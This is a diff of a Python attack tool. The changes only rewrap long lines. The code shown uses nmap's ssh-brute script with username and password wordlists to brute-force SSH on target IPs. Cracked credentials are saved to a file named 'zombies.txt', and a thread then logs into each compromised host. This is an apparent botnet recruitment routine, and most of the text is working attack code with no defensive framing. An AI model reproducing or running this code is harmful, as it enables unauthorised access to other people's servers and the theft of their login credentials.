@@ -63,9 +63,11 @@ def sshLogin(user, ip, password):
 
 
 def ssh(ip):
-    threadSafePrint(bcolors.BOLD, bcolors.HEADER, " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip, bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD, bcolors.HEADER,
+                    " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip, bcolors.ENDC)
     zombies = openFile('zombies.txt', 'a')
-    scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt  --script-args ssh-brute.timeout=8s')
+    scanner_t2.scan(hosts=ip, ports='22',
+                    arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt  --script-args ssh-brute.timeout=8s')
 
     if scanner_t2[ip].state() == 'up':
         protocols = scanner_t2[ip].all_protocols()
@@ -74,12 +76,14 @@ def ssh(ip):
             try:
                 data = ports['tcp'][22]['script']['ssh-brute']
                 user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
-                threadSafePrint(bcolors.OKGREEN, "^^^^^^^^^^^^^^^^^^^^^^^^^^^ ACCESS GRANTED ^^^^^^^^^^^^^^^^^^^^^^", bcolors.ENDC)
+                threadSafePrint(bcolors.OKGREEN, "^^^^^^^^^^^^^^^^^^^^^^^^^^^ ACCESS GRANTED ^^^^^^^^^^^^^^^^^^^^^^",
+                                bcolors.ENDC)
                 zombies.write(ip + " " + user + " " + password + '\n')
                 t = Thread(target=sshLogin, args=(user, ip, password))
                 t.start()
             except:
-                threadSafePrint(bcolors.BOLD, bcolors.FAIL, "xxxxxxxxxxxxxxxxxxxxx NOT CONNECTED TO ", ip, "xxxxxxxxxxxxxxxxxxx", bcolors.ENDC)
+                threadSafePrint(bcolors.BOLD, bcolors.FAIL, "xxxxxxxxxxxxxxxxxxxxx NOT CONNECTED TO ", ip,
+                                "xxxxxxxxxxxxxxxxxxx", bcolors.ENDC)
         else:
             threadSafePrint(bcolors.BOLD, bcolors.WARNING, "tcp is not in supported protocol list", bcolors.ENDC)
     else:
